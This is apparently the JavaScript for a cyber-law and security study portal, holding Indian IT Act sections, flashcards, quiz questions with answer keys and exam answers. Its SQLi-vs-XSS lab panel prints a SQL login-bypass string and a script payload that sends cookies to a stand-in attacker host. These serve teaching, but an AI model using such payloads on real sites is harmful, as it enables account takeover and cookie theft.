// ============================================================================
// CHAPTER 3 WEB PORTAL — INTERACTIVE APPLICATION LOGIC
// ============================================================================

const jurisdictions = [
  {
    name: "🇺🇸 United States",
    laws: "Computer Fraud & Abuse Act (CFAA) & USA PATRIOT Act",
    desc: "CFAA criminalizes unauthorized access to protected computers and federal networks. The USA PATRIOT Act strengthens law enforcement powers to investigate and prosecute cyber terrorism and critical infrastructure attacks."
  },
  {
    name: "🇪🇺 European Union",
    laws: "General Data Protection Regulation (GDPR)",
    desc: "Enforces strict rules for personal data privacy, user consent, data minimization, and 72-hour breach notifications. Imposes heavy penalties (up to €20M or 4% of global annual turnover) for non-compliance."
  },
  {
    name: "🇬🇧 United Kingdom",
    laws: "Computer Misuse Act, 1990",
    desc: "Criminalizes unauthorized access to computer material (hacking), unauthorized access with intent to commit further offenses, and unauthorized modification of computer data (malware/ransomware)."
  },
  {
    name: "🇸🇬🇦🇺 Singapore & Australia",
    laws: "Computer Misuse Act / Cybercrime Act",
    desc: "Comprehensive statutory frameworks addressing hacking, online financial fraud, critical infrastructure protection, and mandatory data breach disclosures."
  },
  {
    name: "🌐 International Treaties",
    laws: "Budapest Convention (2001), Interpol & UN Initiatives",
    desc: "The Budapest Convention is the first global treaty harmonizing national cybercrime legislation and enabling cross-border evidence sharing. Interpol and UN initiatives foster joint operations against international botnets."
  }
];

const itActSections = [
  { sec: "Sec. 43", title: "Unauthorized Access & System Damage", yr: "IT Act 2000", pen: "Civil liability & financial compensation for damages", desc: "Covers unauthorized access, downloading/copying data, introducing computer viruses/contaminants, disrupting systems, or denying access to authorized users." },
  { sec: "Sec. 43A", title: "Corporate Negligence in Data Protection", yr: "2008 Amendment", pen: "Compensation to affected individuals (no upper limit)", desc: "Mandates that any body corporate handling sensitive personal data must implement reasonable security practices; holds companies liable for data breach negligence." },
  { sec: "Sec. 66", title: "Computer-Related Offenses (Hacking)", yr: "IT Act 2000", pen: "Up to 3 years imprisonment + fine up to ₹5 Lakh", desc: "Dishonestly or fraudulently performing any act listed under Section 43 with malicious intent." },
  { sec: "Sec. 66C", title: "Identity Theft", yr: "2008 Amendment", pen: "Up to 3 years imprisonment + fine up to ₹1 Lakh", desc: "Fraudulently or dishonestly using the electronic signature, password, or unique identification feature of another person." },
  { sec: "Sec. 66D", title: "Cheating by Personation (Impersonation)", yr: "2008 Amendment", pen: "Up to 3 years imprisonment + fine up to ₹1 Lakh", desc: "Cheating by impersonating someone using a computer resource or communication device (covers phishing, fake profiles, and Vishing scams)." },
  { sec: "Sec. 66F", title: "Cyber Terrorism", yr: "2008 Amendment", pen: "Imprisonment extendable to Life Imprisonment", desc: "Cyber attacks committed with intent to threaten the unity, integrity, security, or sovereignty of India, or strike terror in the population." },
  { sec: "Sec. 67 & 67B", title: "Obscene Content & CSAM Prohibition", yr: "2000 / 2008", pen: "3 to 5 years imprisonment + fine up to ₹10 Lakh", desc: "Sec 67 penalizes publishing/transmitting obscene material in electronic form; Sec 67B strictly prohibits Child Sexually Abusive Material (CSAM)." },
  { sec: "Sec. 68–74", title: "Certifying Authorities & Digital Certificates", yr: "IT Act 2000", pen: "Up to 2–3 years imprisonment and/or fine", desc: "Governs the Controller of Certifying Authorities (CCA), protected systems (Sec 70), and penalties for publishing false digital signature certificates." },
  { sec: "Sec. 72 & 85", title: "Breach of Confidentiality & Corporate Liability", yr: "IT Act 2000", pen: "Up to 2 years imprisonment or ₹1 Lakh fine", desc: "Sec 72 penalizes officials who disclose electronic records without consent; Sec 85 holds company directors/executives liable if crimes occur through their negligence." }
];

const iprIssues = [
  { title: "1. Software Piracy (Copyright)", body: "Unauthorized copying, cracking, distribution, or installation of proprietary software (e.g., cracked Microsoft OS or Adobe suites)." },
  { title: "2. Media & Streaming Piracy (Copyright)", body: "Illegal distribution of movies, music, live sports, and games via torrent websites and unauthorized IPTV services." },
  { title: "3. Cybersquatting (Trademark)", body: "Registering domain names identical or confusingly similar to famous brands (e.g., nike-shoes-sale.com) to divert traffic or extort ransom." },
  { title: "4. Patent Infringement in Tech & Pharma", body: "Unauthorized replication of patented software algorithms, 5G protocols, or pharmaceutical R&D processes via cyber espionage." },
  { title: "5. Trade Secret Theft & Espionage", body: "Stealing confidential business algorithms, AI model weights, or customer lists via insider threats or targeted APT breaches." },
  { title: "6. Counterfeit Goods & APK Cracking", body: "Selling fake luxury goods on e-commerce platforms and redistributing cracked paid mobile Android APKs for free." }
];

const csirtStages = [
  { stage: "1. Preparation", badge: "Proactive Readiness", desc: "Establish Acceptable Use Policies (AUPs), form a Computer Security Incident Response Team (CSIRT), build incident playbooks, deploy SIEM/EDR tools, and run tabletop cyber drills." },
  { stage: "2. Identification", badge: "Detection & Triage", desc: "Detect suspicious network or host anomalies via SIEM alerts, IDS/IPS sensors, and log analysis. Confirm whether an event is a genuine security incident." },
  { stage: "3. Containment", badge: "Stop the Spread", desc: "Immediately isolate infected endpoints, disable compromised accounts, or segment VLANs so ransomware or attackers cannot move laterally across the organization." },
  { stage: "4. Eradication", badge: "Root-Cause Removal", desc: "Eliminate malware binaries, close backdoors, rotate leaked API/IAM keys, and patch the exploited software or cloud vulnerability." },
  { stage: "5. Recovery", badge: "Safe Restoration", desc: "Restore affected databases and servers from verified clean backups, test application integrity, and bring business services back online under intensive monitoring." },
  { stage: "6. Lessons Learned", badge: "Post-Incident Review", desc: "Conduct a blameless post-mortem review, update CSIRT playbooks, strengthen defenses, and complete mandatory regulatory reporting (e.g., CERT-In / GDPR)." }
];

const galleryItems = [
  { src: "images/original_img_1.png", title: "1. Chapter 3 Master Overview (3.1–3.4)", tag: "Original Infographic" },
  { src: "images/diag_1_it_act_punishments.png", title: "2. Indian IT Act (2000 & 2008) — Offenses & Penalties", tag: "New Diagram" },
  { src: "images/diag_2_cost_of_cybercrime.png", title: "3. Cost of Cybercrime: Direct vs. Indirect Impact", tag: "New Diagram" },
  { src: "images/original_img_2.png", title: "4. Intellectual Property Rights (IPR) in Cyberspace", tag: "Original Infographic" },
  { src: "images/original_img_3.png", title: "5. Web Threats to Organizations", tag: "Original Infographic" },
  { src: "images/diag_3_sqli_vs_xss.png", title: "6. SQL Injection (SQLi) vs. Cross-Site Scripting (XSS)", tag: "New Diagram" },
  { src: "images/original_img_4.png", title: "7. Cloud Computing Threats", tag: "Original Infographic" },
  { src: "images/diag_4_security_privacy_social.png", title: "8. Security, Privacy & Social Computing Implications", tag: "New Diagram" },
  { src: "images/original_img_5.png", title: "9. 6-Stage Incident Handling & Response Lifecycle", tag: "Original Infographic" },
  { src: "images/diag_5_cia_and_social_engineering.png", title: "10. The CIA Triad & Social Engineering Taxonomy", tag: "New Exam Diagram" },
  { src: "images/diag_6_phishing_and_sqli_types.png", title: "11. Types of Phishing & SQL Injection Attacks", tag: "New Exam Diagram" }
];

const flashcards = [
  { cat: "Global Law", q: "What is the Budapest Convention (2001)?", a: "The first international treaty on cybercrime that harmonizes national cybercriminal laws, defines offenses, and enables cross-border law enforcement cooperation." },
  { cat: "Global Law", q: "Which US laws govern unauthorized access and cyber terrorism?", a: "The Computer Fraud and Abuse Act (CFAA) criminalizes unauthorized computer access, while the USA PATRIOT Act addresses cyber terrorism." },
  { cat: "Indian IT Act", q: "When was the Indian IT Act enacted, and what are its 4 core objectives?", a: "Enacted on 17th October 2000. Objectives: (1) Legal recognition of e-records & digital signatures, (2) Facilitate e-governance/e-commerce, (3) Define cybercrimes & penalties, (4) Establish Certifying Authorities (CCA)." },
  { cat: "Digital Signatures", q: "How do Digital Signatures ensure authenticity and non-repudiation under the IT Act?", a: "They use Public Key Infrastructure (PKI) encryption issued by licensed Certifying Authorities (CAs). The signer's private key signs the hash, preventing denial of signing (non-repudiation)." },
  { cat: "2008 Amendment", q: "What is the difference between Section 66C and Section 66D?", a: "Section 66C penalizes Identity Theft (stealing passwords/digital signatures), whereas Section 66D penalizes Cheating by Impersonation using computer resources (e.g., phishing)." },
  { cat: "Punishments", q: "What is the maximum punishment under Section 66F (Cyber Terrorism)?", a: "Life Imprisonment — applicable when cyber attacks threaten the unity, integrity, security, or sovereignty of India." },
  { cat: "Cost of Cybercrime", q: "Distinguish between Direct and Indirect Costs of Cybercrime.", a: "Direct costs: immediate monetary theft, ransom payments, and regulatory fines ($4–6M avg per breach). Indirect costs: operational downtime, reputational damage, customer churn, and higher insurance premiums." },
  { cat: "IPR in Cyberspace", q: "What are the 4 main types of IPR in cyberspace and their primary cyber risks?", a: "1. Copyright (software/media piracy), 2. Patents (algorithm/R&D infringement), 3. Trademarks (cybersquatting & fake goods), 4. Trade Secrets (industrial espionage & insider leaks)." },
  { cat: "Web Threats", q: "How does Spear-Phishing differ from regular Phishing?", a: "Regular phishing sends bulk deceptive emails to random users, whereas Spear-Phishing is highly targeted at specific executives or privileged employees using tailored personal details." },
  { cat: "SQLi vs XSS", q: "What is the key difference between SQL Injection (SQLi) and Cross-Site Scripting (XSS)?", a: "SQLi injects malicious SQL queries to compromise the backend Server/Database. XSS injects malicious scripts (JavaScript) into web pages to compromise the End-User's Browser." },
  { cat: "Cloud Security", q: "What are the top threats to Cloud Computing environments?", a: "Data breaches, data loss, account hijacking, insecure APIs, malicious insiders, shared technology (hypervisor) vulnerabilities, and cloud misconfigurations (e.g., public AWS S3 buckets)." },
  { cat: "CIA Triad", q: "What are the 3 pillars of the CIA Triad?", a: "Confidentiality (preventing unauthorized disclosure via encryption/MFA), Integrity (preventing unauthorized modification via hashing/signatures), and Availability (ensuring uptime via redundancy/DDoS protection)." },
  { cat: "Social Engineering", q: "Compare Human-Based vs. Computer-Based Social Engineering.", a: "Human-based relies on direct interpersonal manipulation (impersonation, tailgating, dumpster diving). Computer-based uses technical lures (phishing emails, baiting USB drops, scareware pop-ups)." },
  { cat: "Incident Handling", q: "List the 6 sequential stages of Incident Handling & Response.", a: "1. Preparation → 2. Identification → 3. Containment → 4. Eradication → 5. Recovery → 6. Lessons Learned." },
  { cat: "Social Computing", q: "What are the major risks of Social Computing?", a: "Cyberbullying/harassment, fake news/misinformation, oversharing personal data, social engineering identity theft, rapid brand damage, and social media addiction." },
  { cat: "Safe Computing", q: "What key defenses protect organizations from Web and Cloud threats?", a: "Web Application Firewalls (WAFs), Multi-Factor Authentication (MFA), SIEM anomaly monitoring, Role-Based Access Control (RBAC), regular vulnerability scans, and employee phishing drills." }
];

const quizQuestions = [
  {
    q: "1. Which international agreement serves as the first global treaty harmonizing national cybercrime laws?",
    options: ["The Geneva Cyber Accord (1998)", "The Budapest Convention on Cybercrime (2001)", "The GDPR Framework (2018)", "The UN Digital Sovereignty Pact (2010)"],
    correct: 1,
    exp: "The Budapest Convention on Cybercrime (2001) is the first international treaty seeking to address internet and computer crime by harmonizing national laws and improving international cooperation."
  },
  {
    q: "2. Under the Indian IT Act (2008 Amendment), which section specifically deals with Cyber Terrorism and carries up to Life Imprisonment?",
    options: ["Section 43A", "Section 66C", "Section 66F", "Section 72"],
    correct: 2,
    exp: "Section 66F was introduced in the 2008 Amendment to address Cyber Terrorism and prescribes punishment extendable to life imprisonment."
  },
  {
    q: "3. Which cryptographic framework underpins Digital Signatures under the Indian IT Act to guarantee non-repudiation?",
    options: ["Symmetric DES Encryption", "Public Key Infrastructure (PKI)", "Plaintext Checksums", "MAC Address Filtering"],
    correct: 1,
    exp: "Digital signatures rely on Public Key Infrastructure (PKI) with asymmetric key pairs certified by licensed Certifying Authorities (CAs)."
  },
  {
    q: "4. Registering a domain name like 'nike-shoes-sale.com' in bad faith to profit from an established brand's goodwill is an example of:",
    options: ["Trade Secret Espionage", "Patent Infringement", "Cybersquatting (Trademark Violation)", "SQL Injection"],
    correct: 2,
    exp: "Cybersquatting is a Trademark infringement issue where someone registers domain names identical or confusingly similar to famous trademarks."
  },
  {
    q: "5. What is the primary difference between SQL Injection (SQLi) and Cross-Site Scripting (XSS)?",
    options: [
      "SQLi targets the end-user's browser; XSS targets the database server.",
      "SQLi targets the backend database via malicious SQL queries; XSS targets end-users' browsers via injected scripts.",
      "SQLi only affects cloud hypervisors; XSS only affects Wi-Fi routers.",
      "Both target exclusively hardware firewalls."
    ],
    correct: 1,
    exp: "SQLi compromises the backend server/database via unvalidated SQL input, whereas XSS executes malicious JavaScript inside the victim user's browser."
  },
  {
    q: "6. Leaving an AWS S3 storage bucket publicly readable without authentication is an example of which cloud threat?",
    options: ["Hypervisor Escape", "Cloud Misconfiguration", "Spear-Phishing", "Cryptojacking"],
    correct: 1,
    exp: "Cloud misconfiguration (such as publicly exposed storage buckets or databases) is one of the leading causes of cloud data breaches."
  },
  {
    q: "7. In the 6-stage Incident Handling lifecycle, what is the immediate step AFTER 'Identification' of an active ransomware infection?",
    options: ["Lessons Learned", "Preparation", "Containment (isolating affected systems)", "Public Relations Marketing"],
    correct: 2,
    exp: "Once an incident is identified (Stage 2), the CSIRT immediately performs Containment (Stage 3) by isolating infected hosts/segments so the attack cannot spread further."
  },
  {
    q: "8. An attacker physically follows an authorized employee through a secure door without swiping a badge. What type of social engineering is this?",
    options: ["Computer-based Whaling", "Human-based Tailgating / Piggybacking", "Vishing", "Pharming"],
    correct: 1,
    exp: "Tailgating (or piggybacking) is a physical, human-based social engineering technique exploiting human courtesy or inattention to bypass physical access controls."
  },
  {
    q: "9. Which type of SQL Injection relies on sending true/false questions and observing application response times when no error messages are displayed?",
    options: ["In-Band Error-Based SQLi", "In-Band Union-Based SQLi", "Inferential (Blind) SQLi", "Cross-Site Scripting"],
    correct: 2,
    exp: "Inferential (Blind) SQLi (Boolean-based or Time-based) infers database content by observing behavioral or timing differences when no data is directly returned."
  },
  {
    q: "10. Which principle of the CIA Triad ensures that medical or financial records cannot be silently altered in transit or at rest?",
    options: ["Confidentiality", "Integrity", "Availability", "Scalability"],
    correct: 1,
    exp: "Integrity ensures data accuracy, completeness, and protection from unauthorized modification or tampering (using hashing, checksums, and digital signatures)."
  }
];

const examQA = [
  {
    q: "1 A) What is cybercrime? What are classifications of cybercrime? Explain each one briefly.",
    a: `<p><strong>Definition:</strong> Cybercrime is any unlawful act where a computer, digital device, or network is used as a <em>target</em> (hacking, DDoS), a <em>tool/weapon</em> (phishing, online fraud), or an <em>incidental storage repository</em> for illegal activity.</p>
    <ul>
      <li><strong>1. Crimes Against Individuals:</strong> Target personal identity, privacy, and safety — <em>Identity Theft (Sec 66C), Phishing (Sec 66D), Cyberstalking, Cyberbullying, Obscene Material (Sec 67), CSAM (Sec 67B).</em></li>
      <li><strong>2. Crimes Against Property (Organizations):</strong> Target financial assets, systems, and IP — <em>Unauthorized Access/Virus Injection (Sec 43/66), Ransomware, Credit Card Fraud, Software Piracy, Cybersquatting.</em></li>
      <li><strong>3. Crimes Against Government &amp; Society:</strong> Threaten national security and sovereignty — <em>Cyber Terrorism (Sec 66F), Critical Infrastructure attacks, Cyber Warfare, Disinformation campaigns.</em></li>
    </ul>`
  },
  {
    q: "1 C) Why is it essential for an organization to implement all principles of the CIA Triad?",
    a: `<p>The <strong>CIA Triad (Confidentiality, Integrity, Availability)</strong> is the foundational model of cybersecurity. Neglecting any one pillar compromises the entire organization:</p>
    <ul>
      <li><strong>Confidentiality:</strong> Protects sensitive data from unauthorized disclosure (via AES/TLS Encryption, MFA, RBAC). Without it, PII and trade secrets leak, triggering GDPR / IT Act Sec 43A fines.</li>
      <li><strong>Integrity:</strong> Ensures data is accurate and untampered with (via SHA-256 Hashing &amp; PKI Digital Signatures). Without it, attackers can silently alter bank balances, medical records, or financial ledgers.</li>
      <li><strong>Availability:</strong> Ensures reliable, timely access for authorized users (via Redundancy, 3-2-1 Backups, DDoS protection). Without it, ransomware or DDoS halts business operations completely.</li>
    </ul>`
  },
  {
    q: "2 A) What is Social Engineering? Explain human-based and computer-based social engineering with suitable examples.",
    a: `<p><strong>Definition:</strong> Psychological manipulation of people into performing actions or divulging confidential data (passwords, OTPs) by exploiting trust, authority, urgency, or fear.</p>
    <ul>
      <li><strong>Human-Based Social Engineering:</strong> Direct interpersonal interaction. Examples: <em>Impersonation/Pretexting</em> (calling an employee posing as IT support to ask for their password), <em>Tailgating/Piggybacking</em> (following staff through a badge-controlled door), <em>Shoulder Surfing &amp; Dumpster Diving</em>.</li>
      <li><strong>Computer-Based Social Engineering:</strong> Uses software/digital channels to scale attacks. Examples: <em>Phishing/Spear-Phishing emails</em>, <em>Baiting</em> (dropping malware-infected USB drives labeled "Executive Bonus List"), and <em>Scareware pop-ups</em>.</li>
    </ul>`
  },
  {
    q: "2 B) What is Phishing? What are the different types of phishing attacks?",
    a: `<p><strong>Definition:</strong> A cyberattack where criminals impersonate trusted entities (banks, cloud providers, government agencies) to trick users into revealing credentials or installing malware.</p>
    <ul>
      <li><strong>1. Deceptive (Bulk) Phishing:</strong> Mass emails sent to thousands of users using false urgency.</li>
      <li><strong>2. Spear-Phishing:</strong> Customized attacks targeting a specific person or job role using researched personal details.</li>
      <li><strong>3. Whaling (CEO Fraud):</strong> Targeting C-level executives (CEO, CFO) to authorize fraudulent wire transfers.</li>
      <li><strong>4. Smishing (SMS Phishing):</strong> Malicious links sent via SMS text messages (e.g., fake KYC expiry alerts).</li>
      <li><strong>5. Vishing (Voice Phishing):</strong> Phone scams using spoofed caller IDs to extract OTPs or CVV numbers.</li>
      <li><strong>6. Clone Phishing:</strong> Duplicating a legitimate previously delivered email and replacing its link/attachment with malware.</li>
      <li><strong>7. Pharming:</strong> DNS cache poisoning that silently redirects users typing a legitimate URL to a spoofed website.</li>
    </ul>`
  },
  {
    q: "3 A) What is SQL Injection? Explain types of SQL injection attacks.",
    a: `<p><strong>Definition:</strong> A critical web vulnerability where an attacker injects malicious SQL statements (e.g., <code>' OR '1'='1' --</code>) into unvalidated input fields to manipulate the backend database.</p>
    <ul>
      <li><strong>1. In-Band SQLi (Classic):</strong> Uses the same channel to launch the attack and read results directly — includes <em>Error-Based SQLi</em> (extracting schema via verbose DB errors) and <em>UNION-Based SQLi</em> (combining stolen table rows with page output).</li>
      <li><strong>2. Inferential (Blind) SQLi:</strong> Used when no data/errors are returned on the page — includes <em>Boolean-Based Blind</em> (observing TRUE/FALSE page changes) and <em>Time-Based Blind</em> (using <code>SLEEP()</code> delays to infer data bit-by-bit).</li>
      <li><strong>3. Out-of-Band (OAST) SQLi:</strong> Forces the database server to make an outbound DNS or HTTP request to an attacker-controlled server carrying the exfiltrated data.</li>
    </ul>`
  },
  {
    q: "4 C) What are the weak areas & positive areas of the Indian IT Act, 2000?",
    a: `<p><strong>Positive Areas (Strengths):</strong> (1) Legal recognition of e-commerce, electronic records, and PKI Digital Signatures; (2) Enables Digital India &amp; e-governance; (3) 2008 Amendment added Identity Theft (66C), Phishing (66D), Cyber Terrorism (66F), and CSAM (67B); (4) Corporate data protection liability under Sec 43A &amp; 85; (5) Extraterritorial jurisdiction under Sec 75.</p>
    <p style="margin-top:0.5rem"><strong>Weak Areas (Limitations):</strong> (1) Many 3-year offenses are bailable, reducing deterrence; (2) Cross-border enforcement challenges (India is not a signatory to the Budapest Convention); (3) Originally silent on AI deepfakes, crypto laundering, and IoT botnets; (4) Lacks dedicated provisions for domain cybersquatting; (5) Shortage of local cyber forensic labs.</p>`
  },
  {
    q: "6 A) How do forensics & social networking intersect on social media platforms? Illustrate with an example.",
    a: `<p><strong>Social Media Forensics</strong> collects, preserves, and analyzes digital evidence from platforms like Instagram, X, Facebook, and WhatsApp.</p>
    <ul>
      <li><strong>Artifacts Analyzed:</strong> EXIF photo metadata (GPS coordinates, timestamps), IP session logs, social graph connections, and direct message history.</li>
      <li><strong>Legal Admissibility:</strong> Volatile posts are preserved with SHA-256 cryptographic hashes and certified under Section 65B of the Indian Evidence Act (Section 63 BSA).</li>
      <li><strong>Illustrative Example:</strong> In a corporate extortion case where stolen blueprints were leaked via an anonymous social handle, investigators correlated platform login IP logs with unstripped EXIF GPS metadata from a background photo to identify and convict a rogue insider contractor.</li>
    </ul>`
  },
  {
    q: "7 A) Explain ethical dimensions of cybercrime. Describe the mindset & skillsets of hackers with examples.",
    a: `<p><strong>Ethical Dimensions:</strong> Security tools are dual-use; ethics separates authorized vulnerability research (consent, privacy protection, responsible disclosure) from cybercrime (greed, coercion, harm).</p>
    <ul>
      <li><strong>White Hat (Ethical Hackers):</strong> Authorized penetration testers &amp; bug bounty hunters who fix flaws before criminals exploit them.</li>
      <li><strong>Black Hat (Crackers):</strong> Malicious actors driven by financial gain or sabotage (e.g., deploying ransomware on hospitals).</li>
      <li><strong>Grey Hat:</strong> Probe systems without permission out of curiosity and notify the owner without stealing data.</li>
      <li><strong>Core Skillsets:</strong> Mastery of TCP/IP networking, Linux/Windows OS internals, Python/SQL/JavaScript/C, cryptography, reverse engineering, and social engineering.</li>
    </ul>`
  },
  {
    q: "7 B) Explain the need for IP (Intellectual Property) in Cyberspace. Explain various types and justify with examples.",
    a: `<p><strong>Need for IP in Cyberspace:</strong> Digital creations cost millions to develop but can be cloned and shared globally in seconds at near-zero cost. IP laws protect creator revenue, incentivize R&amp;D innovation, and protect consumers from malware-infected pirated software and counterfeit goods.</p>
    <ul>
      <li><strong>1. Copyrights:</strong> Protect software code, books, music, films (e.g., preventing torrent movie piracy &amp; cracked software).</li>
      <li><strong>2. Patents:</strong> Protect novel inventions, technical processes, and hardware/software algorithms.</li>
      <li><strong>3. Trademarks:</strong> Protect brand names, logos, and domains (e.g., stopping <em>Cybersquatting</em> like <code>nike-shoes-sale.com</code>).</li>
      <li><strong>4. Trade Secrets:</strong> Protect confidential algorithms, source code, and customer lists from industrial espionage.</li>
    </ul>`
  }
];

// State
let fcIndex = 0;
let masteredSet = new Set();
let quizAnswers = {};

function navigate(viewId) {
  document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
  document.getElementById('view-' + viewId).classList.add('active');
  document.querySelectorAll('.nav-item').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.view === viewId);
  });
  document.getElementById('sidebar').classList.remove('open');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}

function toggleTheme() {
  const root = document.documentElement;
  const next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
  root.setAttribute('data-theme', next);
  document.getElementById('theme-toggle-btn').textContent = next === 'dark' ? '☀️ Light Mode' : '🌙 Dark Mode';
}

function updateMasteryUI() {
  const fcScore = (masteredSet.size / flashcards.length) * 50;
  const qScore = (Object.keys(quizAnswers).length / quizQuestions.length) * 50;
  const total = Math.round(fcScore + qScore);
  document.getElementById('mastery-pct').textContent = total + '%';
  document.getElementById('mastery-bar').style.width = total + '%';
  document.getElementById('mastery-detail').textContent = `${masteredSet.size}/${flashcards.length} Flashcards • ${Object.keys(quizAnswers).length}/${quizQuestions.length} Quiz`;
}

// 3.1 Jurisdiction Tabs
function initJurisdictions() {
  const tabs = document.getElementById('jurisdiction-tabs');
  tabs.innerHTML = jurisdictions.map((j, i) =>
    `<button class="pill-btn ${i === 0 ? 'active' : ''}" onclick="selectJurisdiction(${i})" id="jur-btn-${i}">${j.name}</button>`
  ).join('');
  selectJurisdiction(0);
}

function selectJurisdiction(idx) {
  jurisdictions.forEach((_, i) => {
    document.getElementById('jur-btn-' + i).classList.toggle('active', i === idx);
  });
  const j = jurisdictions[idx];
  document.getElementById('jurisdiction-detail').innerHTML = `
    <div style="font-weight:700;font-size:1rem;color:var(--primary);margin-bottom:0.35rem">${j.name} — ${j.laws}</div>
    <p>${j.desc}</p>
  `;
}

// 3.3 - 3.6 IT Act Section Explorer
function initITActExplorer() {
  const tabs = document.getElementById('it-sec-tabs');
  tabs.innerHTML = itActSections.map((s, i) =>
    `<button class="pill-btn ${i === 0 ? 'active' : ''}" onclick="selectITSection(${i})" id="itsec-btn-${i}">${s.sec}</button>`
  ).join('');
  selectITSection(0);
}

function selectITSection(idx) {
  itActSections.forEach((_, i) => {
    document.getElementById('itsec-btn-' + i).classList.toggle('active', i === idx);
  });
  const s = itActSections[idx];
  document.getElementById('it-sec-detail').innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.4rem">
      <strong style="font-size:1.05rem;color:var(--primary)">${s.sec}: ${s.title}</strong>
      <span class="badge">${s.yr}</span>
    </div>
    <p style="margin-bottom:0.65rem">${s.desc}</p>
    <div style="padding:0.6rem 0.85rem;border-radius:8px;background:rgba(239,68,68,0.14);border:1px solid rgba(239,68,68,0.35);font-size:0.84rem">
      <strong>Prescribed Penalty:</strong> ${s.pen}
    </div>
  `;
}

// 3.4 PKI Simulator
function simpleHash(str) {
  let h1 = 0xdeadbeef ^ str.length, h2 = 0x41c6ce57 ^ str.length;
  for (let i = 0, ch; i < str.length; i++) {
    ch = str.charCodeAt(i);
    h1 = Math.imul(h1 ^ ch, 2654435761);
    h2 = Math.imul(h2 ^ ch, 1597334677);
  }
  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
  return (h2 >>> 0).toString(16).padStart(8, '0') + (h1 >>> 0).toString(16).padStart(8, '0') + "a94f8c2d7e1b0539";
}

function updatePKISim() {
  const val = document.getElementById('pki-input').value;
  const hash = simpleHash(val);
  document.getElementById('pki-hash').textContent = hash;
  document.getElementById('pki-sig').textContent = "SIG-RSA2048::" + hash.split('').reverse().join('').toUpperCase();
  const st = document.getElementById('pki-status');
  st.className = "status-valid";
  st.textContent = "✔ VALIDATED — Signature Matches Document Hash (Non-Repudiation Guaranteed)";
}

function tamperPKIDoc() {
  const inp = document.getElementById('pki-input');
  inp.value = inp.value + " [TAMPERED ₹99,00,000]";
  document.getElementById('pki-hash').textContent = simpleHash(inp.value) + " (MISMATCH!)";
  const st = document.getElementById('pki-status');
  st.className = "status-invalid";
  st.textContent = "✖ VERIFICATION FAILED — Document Hash Does Not Match CA Signature!";
}

// 3.7 IPR Cards
function initIPRCards() {
  document.getElementById('ipr-cards-grid').innerHTML = iprIssues.map(item => `
    <div class="highlight-panel">
      <div style="font-weight:700;color:var(--primary);margin-bottom:0.35rem">${item.title}</div>
      <div class="muted-text">${item.body}</div>
    </div>
  `).join('');
}

// 3.8 SQLi vs XSS Lab
function switchAttackLab(mode) {
  document.getElementById('btn-lab-sqli').classList.toggle('active', mode === 'sqli');
  document.getElementById('btn-lab-xss').classList.toggle('active', mode === 'xss');
  const box = document.getElementById('attack-lab-content');
  if (mode === 'sqli') {
    box.innerHTML = `
      <div style="font-weight:700;font-size:1rem;color:var(--primary);margin-bottom:0.4rem">SQL Injection (SQLi) — Compromises the Backend Database Server</div>
      <p style="margin-bottom:0.6rem">Attacker injects malicious SQL syntax into login/search forms so the database executes unintended commands:</p>
      <div style="background:#0f172a;color:#38bdf8;padding:0.75rem;border-radius:8px;font-family:monospace;font-size:0.83rem;margin-bottom:0.6rem">
        Attacker Input: admin' OR '1'='1' --<br/>
        Resulting SQL: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'
      </div>
      <div><strong>Impact:</strong> Full database dump, unauthorized record modification/deletion. <strong>Defense:</strong> Prepared Statements (Parameterized Queries) &amp; WAF.</div>
    `;
  } else {
    box.innerHTML = `
      <div style="font-weight:700;font-size:1rem;color:var(--accent-amber);margin-bottom:0.4rem">Cross-Site Scripting (XSS) — Compromises the End-User's Web Browser</div>
      <p style="margin-bottom:0.6rem">Attacker injects malicious client-side JavaScript into a web page (e.g., forum comment) viewed by other users:</p>
      <div style="background:#0f172a;color:#fbbf24;padding:0.75rem;border-radius:8px;font-family:monospace;font-size:0.83rem;margin-bottom:0.6rem">
        Injected Payload: &lt;script&gt;fetch('https://attacker.example/steal?cookie=' + document.cookie)&lt;/script&gt;
      </div>
      <div><strong>Impact:</strong> Session hijacking, cookie theft, phishing redirects. <strong>Defense:</strong> Context-aware Output Encoding, Content Security Policy (CSP) &amp; HttpOnly cookies.</div>
    `;
  }
}

// 3.11 CSIRT Stepper
function initCSIRTStepper() {
  const tabs = document.getElementById('csirt-tabs');
  tabs.innerHTML = csirtStages.map((s, i) =>
    `<button class="pill-btn ${i === 0 ? 'active' : ''}" onclick="selectCSIRT(${i})" id="csirt-btn-${i}">${s.stage}</button>`
  ).join('');
  selectCSIRT(0);
}

function selectCSIRT(idx) {
  csirtStages.forEach((_, i) => {
    document.getElementById('csirt-btn-' + i).classList.toggle('active', i === idx);
  });
  const s = csirtStages[idx];
  document.getElementById('csirt-detail').innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.35rem">
      <strong style="font-size:1.05rem;color:var(--primary)">${s.stage}</strong>
      <span class="badge badge-green">${s.badge}</span>
    </div>
    <p>${s.desc}</p>
  `;
}

// Visual Gallery
function initGallery() {
  document.getElementById('gallery-grid').innerHTML = galleryItems.map(g => `
    <div class="card" style="padding:1rem">
      <div class="img-container" onclick="openLightbox('${g.src}', '${g.title}')">
        <img src="${g.src}" alt="${g.title}" />
      </div>
      <div style="display:flex;justify-content:space-between;align-items:center;gap:0.5rem">
        <strong style="font-size:0.86rem">${g.title}</strong>
        <span class="badge">${g.tag}</span>
      </div>
    </div>
  `).join('');
}

function openLightbox(src, caption) {
  document.getElementById('lightbox-img').src = src;
  document.getElementById('lightbox-caption').textContent = caption;
  document.getElementById('lightbox-modal').classList.remove('hidden');
}

function closeLightbox() {
  document.getElementById('lightbox-modal').classList.add('hidden');
}

// Flashcards
function renderFlashcard() {
  const item = flashcards[fcIndex];
  document.getElementById('fc-card-inner').classList.remove('flipped');
  document.getElementById('fc-cat').textContent = item.cat.toUpperCase();
  document.getElementById('fc-q-text').textContent = item.q;
  document.getElementById('fc-a-text').textContent = item.a;
